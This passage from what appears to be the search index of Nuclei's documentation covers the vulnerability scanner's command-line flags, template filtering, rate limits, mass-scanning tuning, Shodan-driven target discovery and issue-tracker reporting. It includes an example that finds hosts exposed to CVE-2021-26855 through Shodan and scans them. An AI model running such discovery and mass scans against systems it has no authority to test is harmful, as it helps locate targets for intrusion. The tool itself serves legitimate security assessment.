-markdown-export string directory to export results in markdown format -se, -sarif-export string file to export results in SARIF format -je, -json-export string file to export results in JSON format -jle, -jsonl-export string file to export results in JSONL(ine) format CONFIGURATIONS: -config string path to the nuclei configuration file -fr, -follow-redirects enable following redirects for http templates -fhr, -follow-host-redirects follow redirects on the same host -mr, -max-redirects int max number of redirects to follow for http templates (default 10) -dr, -disable-redirects disable redirects for http templates -rc, -report-config string nuclei reporting module configuration file -H, -header string[] custom header/cookie to include in all http request in header:value format (cli, file) -V, -var value custom vars in key=value format -r, -resolvers string file containing resolver list for nuclei -sr, -system-resolvers use system DNS resolving as error fallback -dc, -disable-clustering disable clustering of requests -passive enable passive HTTP response processing mode -fh2, -force-http2 force http2 connection on requests -ev, -env-vars enable environment variables to be used in template -cc, -client-cert string client certificate file (PEM-encoded) used for authenticating against scanned hosts -ck, -client-key string client key file (PEM-encoded) used for authenticating against scanned hosts -ca, -client-ca string client certificate authority file (PEM-encoded) used for authenticating against scanned hosts -sml, -show-match-line show match lines for file templates, works with extractors only -ztls use ztls library with autofallback to standard one for tls13 [Deprecated] autofallback to ztls is enabled by default -sni string tls sni hostname to use (default: input domain name) -lfa, -allow-local-file-access allows file (payload) access anywhere on the system -lna, -restrict-local-network-access blocks connections to the local / private network -i, -interface string network interface to use for network scan -at, -attack-type string type of payload combinations to perform (batteringram,pitchfork,clusterbomb) -sip, -source-ip string source ip address to use for network scan -config-directory string override the default config path ($home/.config) -rsr, -response-size-read int max response size to read in bytes (default 10485760) -rss, -response-size-save int max response size to read in bytes (default 1048576) -reset reset removes all nuclei configuration and data files (including nuclei-templates) -tlsi, -tls-impersonate enable experimental client hello (ja3) tls randomization INTERACTSH: -iserver, -interactsh-server string interactsh server url for self-hosted instance (default: oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me) -itoken, -interactsh-token string authentication token for self-hosted interactsh server -interactions-cache-size int number of requests to keep in the interactions cache (default 5000) -interactions-eviction int number of seconds to wait before evicting requests from cache (default 60) -interactions-poll-duration int number of seconds to wait before each interaction poll request (default 5) -interactions-cooldown-period int extra time for interaction polling before exiting (default 5) -ni, -no-interactsh disable interactsh server for OAST testing, exclude OAST based templates FUZZING: -ft, -fuzzing-type string overrides fuzzing type set in template (replace, prefix, postfix, infix) -fm, -fuzzing-mode string overrides fuzzing mode set in template (multiple, single) UNCOVER: -uc, -uncover enable uncover engine -uq, -uncover-query string[] uncover search query -ue, -uncover-engine string[] uncover search engine (shodan,censys,fofa,shodan-idb,quake,hunter,zoomeye,netlas,criminalip,publicwww,hunterhow) (default shodan) -uf, -uncover-field string uncover fields to return (ip,port,host) (default \"ip:port\") -ul, -uncover-limit int uncover results to return (default 100) -ur, -uncover-ratelimit int override ratelimit of engines with unknown ratelimit (default 60 req/min) (default 60) RATE-LIMIT: -rl, -rate-limit int maximum number of requests to send per second (default 150) -rlm, -rate-limit-minute int maximum number of requests to send per minute -bs, -bulk-size int maximum number of hosts to be analyzed in parallel per template (default 25) -c, -concurrency int maximum number of templates to be executed in parallel (default 25) -hbs, -headless-bulk-size int maximum number of headless hosts to be analyzed in parallel per template (default 10) -headc, -headless-concurrency int maximum number of headless templates to be executed in parallel (default 10) OPTIMIZATIONS: -timeout int time to wait in seconds before timeout (default 10) -retries int number of times to retry a failed request (default 1) -ldp, -leave-default-ports leave default HTTP/HTTPS ports (eg. host:80,host:443) -mhe, -max-host-error int max errors for a host before skipping from scan (default 30) -te, -track-error string[] adds given error to max-host-error watchlist (standard, file) -nmhe, -no-mhe disable skipping host from scan based on errors -project use a project folder to avoid sending same request multiple times -project-path string set a specific project path -spm, -stop-at-first-match stop processing HTTP requests after the first match (may break template/workflow logic) -stream stream mode - start elaborating without sorting the input -ss, -scan-strategy value strategy to use while scanning(auto/host-spray/template-spray) (default auto) -irt, -input-read-timeout duration timeout on input read (default 3m0s) -nh, -no-httpx disable httpx probing for non-url input -no-stdin disable stdin processing HEADLESS: -headless enable templates that require headless browser support (root user on Linux will disable sandbox) -page-timeout int seconds to wait for each page in headless mode (default 20) -sb, -show-browser show the browser on the screen when running templates with headless mode -ho, -headless-options string[] start headless chrome with additional options -sc, -system-chrome use local installed Chrome browser instead of nuclei installed -lha, -list-headless-action list available headless actions DEBUG: -debug show all requests and responses -dreq, -debug-req show all sent requests -dresp, -debug-resp show all received responses -p, -proxy string[] list of http/socks5 proxy to use (comma separated or file input) -pi, -proxy-internal proxy all internal requests -ldf, -list-dsl-function list all supported DSL function signatures -tlog, -trace-log string file to write sent requests trace log -elog, -error-log string file to write sent requests error log -version show nuclei version -hm, -hang-monitor enable nuclei hang monitoring -v, -verbose show verbose output -profile-mem string optional nuclei memory profile dump file -vv display templates loaded for scan -svd, -show-var-dump show variables dump for debugging -ep, -enable-pprof enable pprof debugging server -tv, -templates-version shows the version of the installed nuclei-templates -hc, -health-check run diagnostic check up UPDATE: -up, -update update nuclei engine to the latest released version -ut, -update-templates update nuclei-templates to latest released version -ud, -update-template-dir string custom directory to install / update nuclei-templates -duc, -disable-update-check disable automatic nuclei/templates update check STATISTICS: -stats display statistics about the running scan -sj, -stats-json display statistics in JSONL(ines) format -si, -stats-interval int number of seconds to wait between showing a statistics update (default 5) -m, -metrics expose nuclei metrics on a port -mp, -metrics-port int port to expose nuclei metrics on (default 9092) Running Nuclei \u00b6 Nuclei templates can be primarily executed in two ways, 1) Templates ( -t/templates ) As default, all the templates (except nuclei-ignore list) gets executed from default template installation path. nuclei -u https://example.com Custom template directory or multiple template directory can be executed as follows, nuclei -u https://example.com -t cves/ -t exposures/ Custom template Github repos are downloaded under github directory. Custom repo templates can be passed as follows nuclei -u https://example.com -t github/private-repo Similarly, Templates can be executed against list of URLs. nuclei -list http_urls.txt 2) Workflows ( -w/workflows ) nuclei -u https://example.com -w workflows/ Similarly, Workflows can be executed against list of URLs. nuclei -list http_urls.txt -w workflows/wordpress-workflow.yaml Nuclei Filters \u00b6 Nuclei engine supports three basic filters to customize template execution. Tags ( -tags ) Filter based on tags field available in the template. Severity ( -severity ) Filter based on severity field available in the template. Author ( -author ) Filter based on author field available in the template. As default, Filters are applied on installed path of templates and can be customized with manual template path input. For example, below command will run all the templates installed at ~/nuclei-templates/ directory and has cve tags in it. nuclei -u https://example.com -tags cve And this example will run all the templates available under ~/nuclei-templates/exposures/ directory and has config tag in it. nuclei -u https://example.com -tags config -t exposures/ Multiple filters works together with AND condition, below example runs all template with cve tags AND has critical OR high severity AND geeknik as author of template. nuclei -u https://example.com -tags cve -severity critical,high -author geeknik Multiple filters can also be combined using the template condition flag ( -tc ) that allows complex expressions like the following ones: nuclei -tc \"contains(id,'xss') || contains(tags,'xss')\" nuclei -tc \"contains(tags,'cve') && contains(tags,'ssrf')\" nuclei -tc \"contains(name, 'Local File Inclusion')\" The supported fields are: id string name string description string tags slice of strings authors slice of strings severity string protocol string http_method slice of strings body string (containing all request bodies if any) matcher_type slice of string extractor_type slice of string description string Also, every key-value pair from the template metadata section is accessible. All fields can be combined with logical operators ( || and && ) and used with DSL helper functions. Similarly, all filters are supported in workflows as well. nuclei -w workflows/wordpress-workflow.yaml -severity critical,high -list http_urls.txt Workflows In Workflows, Nuclei filters are applied on templates or sub-templates running via workflows, not on the workflows itself. Rate Limits \u00b6 Nuclei have multiple rate limit controls for multiple factors, including a number of templates to execute in parallel, a number of hosts to be scanned in parallel for each template, and the global number of request / per second you wanted to make/limit using nuclei, here is an example of each flag with description. Flag Description rate-limit Control the total number of request to send per seconds bulk-size Control the number of hosts to process in parallel for each template c Control the number of templates to process in parallel Feel free to play with these flags to tune your nuclei scan speed and accuracy. Tip rate-limit flag takes precedence over the other two flags, the number of requests/seconds can't go beyond the value defined for rate-limit flag regardless the value of c and bulk-size flag. Traffic Tagging \u00b6 Many BugBounty platform/programs requires you to identify the HTTP traffic you make, this can be achieved by setting custom header using config file at $HOME/.config/nuclei/config.yaml or CLI flag -H / header Setting custom header using config file # Headers to include with each request. header : - 'X-BugBounty-Hacker: h1/geekboy' - 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' Setting custom header using CLI flag nuclei -header 'User-Agent : Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' -list urls.txt -tags cves Template Exclusion \u00b6 Nuclei supports a variety of methods for excluding / blocking templates from execution. By default, nuclei excludes the tags/templates listed below from execution to avoid unexpected fuzz based scans and some that are not supposed to run for mass scan, and these can be easily overwritten with nuclei configuration file / flags. Default Template ignore list. nuclei-ignore file is not supposed to be updated / edited / removed by user, to overwrite default ignore list, utilize nuclei configuration file. Nuclei engine supports two ways to manually exclude templates from scan, Exclude Templates ( -exclude-templates/exclude ) exclude-templates flag is used to exclude single or multiple templates and directory, multiple -exclude-templates flag can be used to provide multiple values. Exclude Tags ( -exclude-tags/etags ) exclude-tags flag is used to exclude templates based in defined tags, single or multiple can be used to exclude templates. Example of excluding single template nuclei -list urls.txt -t cves/ -exclude-templates cves/2020/CVE-2020-XXXX.yaml Example of multiple template exclusion nuclei -list urls.txt -exclude-templates exposed-panels/ -exclude-templates technologies/ Example of excluding templates with single tag nuclei -l urls.txt -t cves/ -etags xss Example of excluding templates with multiple tags nuclei -l urls.txt -t cves/ -etags sqli,rce To easily overwrite nuclei-ignore , Nuclei engine supports include-tags / include-templates flag. Example of running blocked templates nuclei -l urls.txt -include-tags iot,misc,fuzz Headless Mode \u00b6 -headless-options \u00b6 Additional chrome options can be specified using -headless-options , for example - nuclei -u https://tesla.com -headless -headless-options --no-sandbox,proxy-server=http://127.0.0.1:8080 Uncover Integration \u00b6 Nuclei supports integration with uncover to execute templates against hosts returned by uncover for the given query. Here are uncover options to use - nuclei -h uncover UNCOVER: -uc, -uncover enable uncover engine -uq, -uncover-query string[] uncover search query -ue, -uncover-engine string[] uncover search engine (shodan,shodan-idb,fofa,censys,quake,hunter,zoomeye,netlas,criminalip) (default shodan) -uf, -uncover-field string uncover fields to return (ip,port,host) (default \"ip:port\") -ul, -uncover-limit int uncover results to return (default 100) -ucd, -uncover-delay int delay between uncover query requests in seconds (0 to disable) (default 1) You have to set the API key of the engine you are using as an environment variable in your shell. export SHODAN_API_KEY=xxx export CENSYS_API_ID=xxx export CENSYS_API_SECRET=xxx export FOFA_EMAIL=xxx export FOFA_KEY=xxx export QUAKE_TOKEN=xxx export HUNTER_API_KEY=xxx export ZOOMEYE_API_KEY=xxx Required API keys can be obtained by signing up on the following platforms Shodan , Censys , Fofa , Quake , Hunter and ZoomEye . Example of template execution using a search query. export SHODAN_API_KEY=xxx nuclei -id 'CVE-2021-26855' -uq 'vuln:CVE-2021-26855' -ue shodan It can also read queries from templates metadata and execute template against hosts returned by uncover for that query. Example of template execution using template-defined search queries. Template snippet of CVE-2021-26855 metadata : shodan-query : 'vuln:CVE-2021-26855' nuclei -t cves/2021/CVE-2021-26855.yaml -uncover nuclei -tags cve -uncover We can update the nuclei configuration file to include these tags for all scans. Mass Scanning using Nuclei \u00b6 Nuclei fully utilises resources to optimise scanning speed. However, when scanning thousands , if not millions, of targets , scanning using default parameter values is bound to cause some performance issues ex: low RPS, Slow Scans, Process Killed, High RAM consumption, etc. this is due to limited resources and network I/O. Hence following parameters need to be tuned based on system configuration and targets. Flag Short Description scan-strategy -ss Scan Strategy to Use (auto/host-spray/template-spray) bulk-size -bs Max Number of targets to scan in parallel concurrency -c Max Number of templates to use in parallel while scanning stream - stream mode - start elaborating without sorting the input Note These are common parameters that need to be tuned . apart from these -rate-limit , -retries , -timeout , -max-host-error also need to be tuned based on targets that are being scanned Which Scan Strategy to Use? \u00b6 scan-strategy option can have three possible values host-spray : All templates are iterated over each target. template-spray : Each template is iterated over all targets. auto (Default) : Placeholder of template-spray for now. User should select Scan Strategy based on number of targets and Each strategy has its own pros & cons. When targets < 1000 . template-spray should be used . this strategy is slightly faster than host-spray but uses more RAM and doesnot optimally reuse connections. When targets > 1000 . host-spray should be used . this strategy uses less RAM than template-spray and reuses HTTP connections along with some minor improvements and these are crucial when mass scanning. Concurrency & Bulk-Size \u00b6 Whatever the scan-strategy is -concurrency and -bulk-size are crucial for tuning any type of scan. While tuning these parameters following points should be noted. If scan-strategy is template-spray -concurrency < bulk-size (Ex: -concurrency 10 -bulk-size 200 ) If scan-strategy is host-spray -concurrency > bulk-size (Ex: -concurrency 200 -bulk-size 10 ) Tip -concurrency x -bulk-size <= 2500 (depending on system config) Stream \u00b6 This option should only be enabled if targets > 10k . This skips any type of sorting or preprocessing on target list. Nuclei Config \u00b6 Since release of v.2.3.2 nuclei uses goflags for clean CLI experience and long/short formatted flags. goflags comes with auto-generated config file support that coverts all available CLI flags into config file, basically you can define all CLI flags into config file to avoid repetitive CLI flags that loads as default for every scan of nuclei. Default path of nuclei config file is $HOME/.config/nuclei/config.yaml , uncomment and configure the flags you wish to run as default. Here is an example config file: # Headers to include with all HTTP request header : - 'X-BugBounty-Hacker: h1/geekboy' # Directory based template execution templates : - cves/ - vulnerabilities/ - misconfiguration/ # Tags based template execution tags : exposures,cve # Template Filters tags : exposures,cve author : geeknik,pikpikcu,dhiyaneshdk severity : critical,high,medium # Template Allowlist include-tags : dos,fuzz # Tag based inclusion (allows overwriting nuclei-ignore list) include-templates : # Template based inclusion (allows overwriting nuclei-ignore list) - vulnerabilities/xxx - misconfiguration/xxxx # Template Denylist exclude-tags : info # Tag based exclusion exclude-templates : # Template based exclusion - vulnerabilities/xxx - misconfiguration/xxxx # Rate Limit configuration rate-limit : 500 bulk-size : 50 concurrency : 50 Once configured, config file be used as default , additionally custom config file can be also provided using -config flag. Running nuclei with custom config file nuclei -config project.yaml -list urls.txt Nuclei Reporting \u00b6 Nuclei comes with reporting module support with the release of v2.3.0 supporting GitHub, GitLab, and Jira integration, this allows nuclei engine to create automatic tickets on the supported platform based on found results. Platform GitHub GitLab Jira Markdown SARIF Elasticsearch Splunk HEC Support -rc, -report-config flag can be used to provide a config file to read configuration details of the platform to integrate. Here is an example config file for all supported platforms. For example, to create tickets on GitHub, create a config file with the following content and replace the appropriate values: # GitHub contains configuration options for GitHub issue tracker github : username : \"$user\" owner : \"$user\" token : \"$token\" project-name : \"testing-project\" issue-label : \"Nuclei\" To store results in Elasticsearch, create a config file with the following content and replace the appropriate values: # elasticsearch contains configuration options for elasticsearch exporter elasticsearch : # IP for elasticsearch instance ip : 127.0.0.1 # Port is the port of elasticsearch instance port : 9200 # IndexName is the name of the elasticsearch index index-name : nuclei To forward results to Splunk HEC, create a config file with the following content and replace the appropriate values: # splunkhec contains configuration options for splunkhec exporter splunkhec : # Hostname for splunkhec instance host : \"$hec_host\" # Port is the port of splunkhec instance port : 8088 # IndexName is the name of the splunkhec index index-name : nuclei # SSL enables ssl for splunkhec connection ssl : true # SSLVerification disables SSL verification for splunkhec ssl-verification : true # HEC Token for the splunkhec instance token : \"$hec_token\" To forward results to Jira, create a config file with the following content and replace the appropriate values: The Jira reporting options allows for custom fields, as well as using variables from the Nuclei templates in those custom fields. The supported variables currently are: $CVSSMetrics , $CVEID , $CWEID , $Host , $Severity , $CVSSScore , $Name In addition, Jira is strict when it comes to custom field entry. If the field is a dropdown, Jira accepts only the case sensitive specific string and the API call is slightly different. To support this, there are three types of customfields. name is the dropdown value id is the ID value of the dropdown freeform is if the customfield the entry of any value To avoid duplication, the JQL query run can be slightly modified by the config file. The CLOSED_STATUS can be changed in the Jira template file using the status-not variable. summary ~ TEMPLATE_NAME AND summary ~ HOSTNAME AND status != CLOSED_STATUS jira : # cloud is the boolean which tells if Jira instance is running in the cloud or on-prem version is used cloud : true # update-existing is the boolean which tells if the existing, opened issue should be updated or new one should be created update-existing : false # URL is the jira application url url : https://localhost/jira # account-id is the account-id of the Jira user or username in case of on-prem Jira account-id : test-account-id # email is the email of the user for Jira instance email : test@test.com # token is the token for Jira instance or password in case of on-prem Jira token : test-token #project-name is the name of the project. project-name : test-project-name #issue-type is the name of the created issue type (case sensitive) issue-type : Bug # SeverityAsLabel (optional) sends the severity as the label of the created issue # User custom fields for Jira Cloud instead severity-as-label : true # Whatever your final status is that you want to use as a closed ticket - Closed, Done, Remediated, etc # When checking for duplicates, the JQL query will filter out status's that match this. # If it finds a match _and_ the ticket does have this status, a new one will be created. status-not : Closed # Customfield supports name, id and freeform. name and id are to be used when the custom field is a dropdown. # freeform can be used if the custom field is just a text entry # Variables can be used to pull various pieces of data from the finding itself. # Supported variables: $CVSSMetrics, $CVEID, $CWEID, $Host, $Severity, $CVSSScore, $Name custom_fields : customfield_00001 : name : \"Nuclei\" customfield_00002 : freeform : $CVSSMetrics customfield_00003 : freeform : $CVSSScore Running nuclei with reporting module: nuclei -l urls.txt -t cves/ -rc issue-tracker.yaml Similarly, other platforms can be configured. Reporting module also supports basic filtering and duplicate checks to avoid duplicate ticket creation. allow-list : severity : high,critical This will ensure to only creating tickets for issues identified with high and critical severity; similarly, deny-list can be used to exclude issues with a specific severity. If you are running periodic scans on the same assets, you might want to consider -rdb, -report-db flag that creates a local copy of the valid findings in the given directory utilized by reporting module to compare and create tickets for unique issues only . nuclei -l urls.txt -t cves/ -rc issue-tracker.yaml -rdb prod Markdown Export Nuclei supports markdown export of valid findings with -me, -markdown-export flag, this flag takes directory as input to store markdown formatted reports. Including request/response in the markdown report is optional, and included when -irr, -include-rr flag is used along with -me . nuclei -l urls.txt -t cves/ -irr -markdown-export reports Optionally, the markdown exports can be sorted by template, host, or severity by setting the enviroment variable: MARKDOWN_EXPORT_SORT_MODE to template , host , or severity . Example: export MARKDOWN_EXPORT_SORT_MODE=severity SARIF Export Nuclei supports SARIF export of valid findings with -se, -sarif-export flag. This flag takes a file as input to store SARIF formatted report. nuclei -l urls.txt -t cves/ -sarif-export report.sarif It is also possible to visualize Nuclei results using sarif file. By Uploading SARIF File to SARIF Viewer By Uploading SARIF File to Github Actions more info here . Note These are not official viewers of Nuclei and Nuclei has no liability towards any of these options to visualize Nuclei results. These are just some publicly available options to visualize SARIF File. Scan Metrics \u00b6 Nuclei expose running scan metrics on a local port 9092 when -metrics flag is used and can be accessed at localhost:9092/metrics , default port to expose scan information is configurable using -metrics-port flag. Here is an example to query metrics while running nuclei as following nuclei -t cves/ -l urls.txt -metrics curl -s localhost:9092/metrics | jq . { \"duration\" : \"0:00:03\" , \"errors\" : \"2\" , \"hosts\" : \"1\" , \"matched\" : \"0\" , \"percent\" : \"99\" , \"requests\" : \"350\" , \"rps\" : \"132\" , \"startedAt\" : \"2021-03-27T18:02:18.886745+05:30\" , \"templates\" : \"256\" , \"total\" : \"352\" } Passive Scan \u00b6 Nuclei engine supports passive mode scanning for HTTP based template utilizing file support, with this support we can run HTTP based templates against locally stored HTTP response data collected from any other tool. nuclei -passive -target http_data Passive mode support is limited for templates having {{BasedURL}} or {{BasedURL/}} as base path. Code Contribution \u00b6 Nuclei templates are the base of the nuclei project. We appreciate it if you can write and submit new templates to keep this project alive, and one of the reasons to keep us motivated to keep working on this project. License \u00b6 Nuclei is distributed under MIT License .","title":"Index"},{"location":"nuclei/get-started/#automate-vulnerability-scans-with-nuclei","text":"Nuclei can help you ensure the security of complex networks / applications. With vulnerability scans, Nuclei can identify security issues on your network. Once configured, Nuclei can provide detailed information on each vulnerability, including: Severity Impact Description Remediation Once you've set up templates, you can automate scans of your systems with every change to your network, and with every discovery of new security issues. In this Getting Started guide, we describe how you can set up Nuclei to automate vulnerability scans on a relatively simple network. You can then use our Templating Guide to customize Nuclei for your networks.","title":"Automate Vulnerability Scans with Nuclei"},{"location":"nuclei/get-started/#nuclei-features","text":"Features. HTTP , DNS , TCP , SSL , FILE protocol support Fully configurable templates. Large scale scanning. Out of band based detection. Easily write your own templates.","title":"Nuclei Features"},{"location":"nuclei/get-started/#nuclei-installation","text":"Go go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest Info Nuclei require latest GO version to install successfully. Brew brew install nuclei Info Supported in macOS (or Linux) Docker docker pull projectdiscovery/nuclei:latest Github git clone https://github.com/projectdiscovery/nuclei.git; \\ cd nuclei/v2/cmd/nuclei; \\ go build; \\ mv nuclei /usr/local/bin/; \\ nuclei -version; Info Nuclei require the latest GO version to install successfully. Binary https://github.com/projectdiscovery/nuclei/releases Tip Download the latest binary for your OS. Unzip the ready to run binary. Helm git clone https://github.com/projectdiscovery/nuclei.git cd nuclei/helm helm upgrade --install nuclei . -f values.yaml Tip This Helm chart creates two primary resources (intended to be configured via values.yaml ): A Kubernetes CronJob to run Nuclei on a defined schedule An Interactsh service for Nuclei to use","title":"Nuclei Installation"},{"location":"nuclei/get-started/#nuclei-templates","text":"","title":"Nuclei Templates"},{"location":"nuclei/get-started/#public-templates","text":"Nuclei has built-in support for automatic template download/update from nuclei templates project which provides community-contributed list of ready-to-use templates that is constantly updated. Nuclei checks for new community template releases upon each execution and automatically downloads the latest version when available. optionally, this feature can be disabled using the -duc cli flag or the configuration file.","title":"Public Templates"},{"location":"nuclei/get-started/#custom-templates","text":"Users can create custom templates on a personal public / private GitHub / AWS Bucket that they wish to run / update while using nuclei from any environment without manually downloading the GitHub repository everywhere. To use this feature, users need to set the following environment variables: For GitHub Project export GITHUB_TOKEN=gh_XXX export GITHUB_TEMPLATE_REPO=my_nuclei_template For GitLab Project export GITLAB_SERVER_URL=https://gitlab.com # The GitLab token must have the read_api and read_repository scope export GITLAB_TOKEN=XXXXXXXXXX # Comma separated list of repository IDs (not names) export GITLAB_REPOSITORY_IDS=12345,67890 For AWS Bucket export AWS_ACCESS_KEY=AKIAXXXXXXXX export AWS_SECRET_KEY=XXXXXX export AWS_REGION=us-xxx-1 export AWS_TEMPLATE_BUCKET=aws_bucket_name For Azure Blob Storage export AZURE_TENANT_ID=00000000-0000-0000-0000-000000000000 export AZURE_CLIENT_ID=00000000-0000-0000-0000-000000000000 export AZURE_CLIENT_SECRET=00000000-0000-0000-0000-000000000000 export AZURE_SERVICE_URL=https://XXXXXXXXXX.blob.core.windows.net/ export AZURE_CONTAINER_NAME=templates Environment variables can also be provided to disable download from default and custom template locations: export DISABLE_NUCLEI_TEMPLATES_PUBLIC_DOWNLOAD=true # Disable download from the default nuclei-templates project export DISABLE_NUCLEI_TEMPLATES_GITHUB_DOWNLOAD=true # Disable download from public / private GitHub project(s) export DISABLE_NUCLEI_TEMPLATES_GITLAB_DOWNLOAD=true # Disable download from public / private GitLab project(s) export DISABLE_NUCLEI_TEMPLATES_AWS_DOWNLOAD=true # Disable download from public / private AWS Bucket(s) export DISABLE_NUCLEI_TEMPLATES_AZURE_DOWNLOAD=true # Disable download from public / private Azure Blob Storage Once the environment variables are set, following command to download the custom templates: nuclei -update-templates This command will clone the repository containing the custom templates to the default nuclei templates directory ( $HOME/nuclei-templates/github/ ). The directory structure of the custom templates looks as follows: tree $HOME /nuclei-templates/ nuclei-templates/ \u2514\u2500\u2500 github/ $GH_REPO_NAME # Custom templates downloaded from public / private GitHub project \u2514\u2500\u2500 gitlab/ $GL_REPO_NAME # Custom templates downloaded from public / private GitLab project \u2514\u2500\u2500 s3/ $BUCKET_NAME # Custom templates downloaded from public / private AWS Bucket \u2514\u2500\u2500 azure/ $CONTAINER_NAME # Custom templates downloaded from public / private Azure Blob Storage Users can then use the custom templates with the -t flag as follows: nuclei -t github/my_custom_template -u https://example.com The nuclei engine can be updated to latest version by using the -update flag. Tip Writing your own unique templates will always keep you one step ahead of others.","title":"Custom Templates"},{"location":"nuclei/get-started/#nuclei-usage","text":"nuclei -h This will display help for the tool. Here are all the switches it supports. Nuclei is a fast, template based vulnerability scanner focusing on extensive configurability, massive extensibility and ease of use. Usage: nuclei [flags] Flags: TARGET: -u, -target string[] target URLs/hosts to scan -l, -list string path to file containing a list of target URLs/hosts to scan (one per line) -resume string resume scan using resume.cfg (clustering will be disabled) -sa, -scan-all-ips scan all the IP's associated with dns record -iv, -ip-version string[] IP version to scan of hostname (4,6) - (default 4) TEMPLATES: -nt, -new-templates run only new templates added in latest nuclei-templates release -ntv, -new-templates-version string[] run new templates added in specific version -as, -automatic-scan automatic web scan using wappalyzer technology detection to tags mapping -t, -templates string[] list of template or template directory to run (comma-separated, file) -tu, -template-url string[] list of template urls to run (comma-separated, file) -w, -workflows string[] list of workflow or workflow directory to run (comma-separated, file) -wu, -workflow-url string[] list of workflow urls to run (comma-separated, file) -validate validate the passed templates to nuclei -nss, -no-strict-syntax disable strict syntax check on templates -td, -template-display displays the templates content -tl list all available templates FILTERING: -a, -author string[] templates to run based on authors (comma-separated, file) -tags string[] templates to run based on tags (comma-separated, file) -etags, -exclude-tags string[] templates to exclude based on tags (comma-separated, file) -itags, -include-tags string[] tags to be executed even if they are excluded either by default or configuration -id, -template-id string[] templates to run based on template ids (comma-separated, file) -eid, -exclude-id string[] templates to exclude based on template ids (comma-separated, file) -it, -include-templates string[] templates to be executed even if they are excluded either by default or configuration -et, -exclude-templates string[] template or template directory to exclude (comma-separated, file) -em, -exclude-matchers string[] template matchers to exclude in result -s, -severity value[] templates to run based on severity. Possible values: info, low, medium, high, critical, unknown -es, -exclude-severity value[] templates to exclude based on severity. Possible values: info, low, medium, high, critical, unknown -pt, -type value[] templates to run based on protocol type. Possible values: dns, file, http, headless, tcp, workflow, ssl, websocket, whois -ept, -exclude-type value[] templates to exclude based on protocol type. Possible values: dns, file, http, headless, tcp, workflow, ssl, websocket, whois -tc, -template-condition string[] templates to run based on expression condition OUTPUT: -o, -output string output file to write found issues/vulnerabilities -sresp, -store-resp store all request/response passed through nuclei to output directory -srd, -store-resp-dir string store all request/response passed through nuclei to custom directory (default \"output\") -silent display findings only -nc, -no-color disable output content coloring (ANSI escape codes) -j, -jsonl write output in JSONL(ines) format -irr, -include-rr -omit-raw include request/response pairs in the JSON, JSONL, and Markdown outputs (for findings only) [DEPRECATED use -omit-raw] (default true) -or, -omit-raw omit request/response pairs in the JSON, JSONL, and Markdown outputs (for findings only) -nm, -no-meta disable printing result metadata in cli output -ts, -timestamp enables printing timestamp in cli output -rdb, -report-db string nuclei reporting database (always use this to persist report data) -ms, -matcher-status display match failure status -me, -markdown-export string directory to export results in markdown format -se, -sarif-export string file to export results in SARIF format -je, -json-export string file to export results in JSON format -jle, -jsonl-export string file to export results in JSONL(ine) format CONFIGURATIONS: -config string path to the nuclei configuration file -fr, -follow-redirects enable following redirects for http templates -fhr, -follow-host-redirects follow redirects on the same host -mr, -max-redirects int max number of redirects to follow for http templates (default 10) -dr, -disable-redirects disable redirects for http templates -rc, -report-config string nuclei reporting module configuration file -H, -header string[] custom header/cookie to include in all http request in header:value format (cli, file) -V, -var value custom vars in key=value format -r, -resolvers string file containing resolver list for nuclei -sr, -system-resolvers use system DNS resolving as error fallback -dc, -disable-clustering disable clustering of requests -passive enable passive HTTP response processing mode -fh2, -force-http2 force http2 connection on requests -ev, -env-vars enable environment variables to be used in template -cc, -client-cert string client certificate file (PEM-encoded) used for authenticating against scanned hosts -ck, -client-key string client key file (PEM-encoded) used for authenticating against scanned hosts -ca, -client-ca string client certificate authority file (PEM-encoded) used for authenticating against scanned hosts -sml, -show-match-line show match lines for file templates, works with extractors only -ztls use ztls library with autofallback to standard one for tls13 [Deprecated] autofallback to ztls is enabled by default -sni string tls sni hostname to use (default: input domain name) -lfa, -allow-local-file-access allows file (payload) access anywhere on the system -lna, -restrict-local-network-access blocks connections to the local / private network -i, -interface string network interface to use for network scan -at, -attack-type string type of payload combinations to perform (batteringram,pitchfork,clusterbomb) -sip, -source-ip string source ip address to use for network scan -config-directory string override the default config path ($home/.config) -rsr, -response-size-read int max response size to read in bytes (default 10485760) -rss, -response-size-save int max response size to read in bytes (default 1048576) -reset reset removes all nuclei configuration and data files (including nuclei-templates) -tlsi, -tls-impersonate enable experimental client hello (ja3) tls randomization INTERACTSH: -iserver, -interactsh-server string interactsh server url for self-hosted instance (default: oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me) -itoken, -interactsh-token string authentication token for self-hosted interactsh server -interactions-cache-size int number of requests to keep in the interactions cache (default 5000) -interactions-eviction int number of seconds to wait before evicting requests from cache (default 60) -interactions-poll-duration int number of seconds to wait before each interaction poll request (default 5) -interactions-cooldown-period int extra time for interaction polling before exiting (default 5) -ni, -no-interactsh disable interactsh server for OAST testing, exclude OAST based templates FUZZING: -ft, -fuzzing-type string overrides fuzzing type set in template (replace, prefix, postfix, infix) -fm, -fuzzing-mode string overrides fuzzing mode set in template (multiple, single) UNCOVER: -uc, -uncover enable uncover engine -uq, -uncover-query string[] uncover search query -ue, -uncover-engine string[] uncover search engine (shodan,censys,fofa,shodan-idb,quake,hunter,zoomeye,netlas,criminalip,publicwww,hunterhow) (default shodan) -uf, -uncover-field string uncover fields to return (ip,port,host) (default \"ip:port\") -ul, -uncover-limit int uncover results to return (default 100) -ur, -uncover-ratelimit int override ratelimit of engines with unknown ratelimit (default 60 req/min) (default 60) RATE-LIMIT: -rl, -rate-limit int maximum number of requests to send per second (default 150) -rlm, -rate-limit-minute int maximum number of requests to send per minute -bs, -bulk-size int maximum number of hosts to be analyzed in parallel per template (default 25) -c, -concurrency int maximum number of templates to be executed in parallel (default 25) -hbs, -headless-bulk-size int maximum number of headless hosts to be analyzed in parallel per template (default 10) -headc, -headless-concurrency int maximum number of headless templates to be executed in parallel (default 10) OPTIMIZATIONS: -timeout int time to wait in seconds before timeout (default 10) -retries int number of times to retry a failed request (default 1) -ldp, -leave-default-ports leave default HTTP/HTTPS ports (eg. host:80,host:443) -mhe, -max-host-error int max errors for a host before skipping from scan (default 30) -te, -track-error string[] adds given error to max-host-error watchlist (standard, file) -nmhe, -no-mhe disable skipping host from scan based on errors -project use a project folder to avoid sending same request multiple times -project-path string set a specific project path -spm, -stop-at-first-match stop processing HTTP requests after the first match (may break template/workflow logic) -stream stream mode - start elaborating without sorting the input -ss, -scan-strategy value 